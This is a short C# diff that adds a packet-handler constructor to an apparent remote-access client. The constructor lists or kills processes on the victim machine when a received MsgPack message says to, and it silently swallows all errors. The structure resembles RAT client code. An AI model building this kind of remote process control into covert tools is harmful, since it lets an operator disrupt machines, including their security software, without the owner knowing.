@@ -11,8 +11,30 @@ using System.Text;
 
 namespace Client.Handle_Packet
 {
-   public class HandleProcessManager
+    public class HandleProcessManager
     {
+        public HandleProcessManager(MsgPack unpack_msgpack)
+        {
+            try
+            {
+                switch (unpack_msgpack.ForcePathObject("Option").AsString)
+                {
+                    case "List":
+                        {
+                            ProcessList();
+                            break;
+                        }
+
+                    case "Kill":
+                        {
+                            ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
+                            break;
+                        }
+                }
+            }
+            catch { }
+        }
+
         public void ProcessKill(int ID)
         {
             foreach (var process in Process.GetProcesses())
